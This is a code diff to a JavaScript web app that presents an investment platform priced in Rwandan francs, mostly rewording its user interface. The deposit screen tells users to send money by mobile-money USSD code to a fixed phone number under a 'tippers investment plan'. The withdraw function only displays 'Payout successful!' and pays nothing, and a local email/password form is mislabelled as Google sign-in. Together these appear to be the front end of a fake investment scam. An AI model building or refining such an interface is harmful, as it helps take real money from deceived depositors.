@@ -162,7 +162,7 @@ function start(){
 nav.style.display="none";
 screen.innerHTML=`
 <h2 class="title">WELCOME</h2>
-<p class="desc">Start your journey</p>
+<p class="desc">Start your journey today!</p>
 <button onclick="register()">NEXT</button>
 `;
 }
@@ -180,7 +180,6 @@ screen.innerHTML=`
 <div class="row">
 <select id="code">
 <option value="+250">RWA +250</option>
-<option value="+254">KEN +254</option>
 </select>
 <input id="phone" placeholder="Phone">
 </div>
@@ -224,7 +223,7 @@ login();
 /* LOGIN */
 function login(){
 screen.innerHTML=`
-<h3 class="title">LOGIN</h3>
+<h3 class="title">SIGN IN BY GOOGLE ACOUNT</h3>
 
 <input id="le" placeholder="Email">
 <input id="lp" placeholder="Password">
@@ -238,7 +237,7 @@ function doLogin(){
 let user = users.find(u=>u.email===val("le") && u.pass===val("lp"));
 
 if(!user){
-toast("Invalid login"); return;
+toast("Invalid Email or incorrect  password, try again!"); return;
 }
 
 currentUser = user;
@@ -251,7 +250,7 @@ home();
 function home(){
 
 screen.innerHTML=`
-<h3 class="title">DASHBOARD</h3>
+<h3 class="title">USER DASHBOARD</h3>
 
 <div class="card">
 Balance: ${currentUser.balance} RWF
@@ -391,9 +390,9 @@ toast("Copied ✔");
 function deposit(){
 
 screen.innerHTML=`
-<h3 class="title">DEPOSIT</h3>
-
-<input id="amt" placeholder="Amount">
+<h3 class="title">DEPOSIT NOW</h3>
+<p class="desc">Deposit require amount shown in table!, read the tippers investment plan and deposit now! </p>
+<input id="amt" placeholder="Enter Amount you want to deposit ">
 <input id="sender" placeholder="Sender name">
 
 <button onclick="pay()">CONTINUE</button>
@@ -409,8 +408,11 @@ toast("Fill all"); return;
 amount=parseInt(val("amt"));
 
 screen.innerHTML=`
-<h3 class="title">PAYMENT</h3>
-<div class="card">0792459701</div>
+<h3 class="title">PAYMENT PROCESS</h3>
+<p class="desc">Pay by using the following way:</p>
+<br></br?
+<div class="card">*182*1*1*0792459701#</div>
+<p class="desc">After pay you can press finish below!</p><br></br>
 <button onclick="finishDeposit()">FINISH</button>
 `;
 }
@@ -432,7 +434,7 @@ toast("Bonus "+bonus+" RWF sent");
 
 localStorage.setItem("users",JSON.stringify(users));
 
-toast("Deposit success ✔");
+toast("Deposit successful!");
 home();
 }
 
@@ -455,7 +457,7 @@ document.getElementById("live").innerText=Math.floor(i)+" RWF";
 function withdraw(){
 
 if(!depositDone){
-toast("Deposit first"); 
+toast("You Must Deposit before Payout!"); 
 return;
 }
 
@@ -463,10 +465,12 @@ screen.innerHTML=`
 <h3 class="title">PAYOUT YOUR EARNS</h3>
 
 <input id="wamt" placeholder="Enter Amount You Want to Withdraw">
+<br></br>
+<br></br>
 
 <input id="phone" placeholder="Enter YOUR Phone Number">
 
-<button onclick="doWithdraw()">PAYOUT</button>
+<button onclick="doWithdraw()">PAYOUT NOW</button>
 `;
 }
 
@@ -477,7 +481,7 @@ toast("Fill all fields");
 return;
 }
 
-toast("Payout successful! check your balance");
+toast("Payout successful! check your balance now");
 }
 
 /* START */
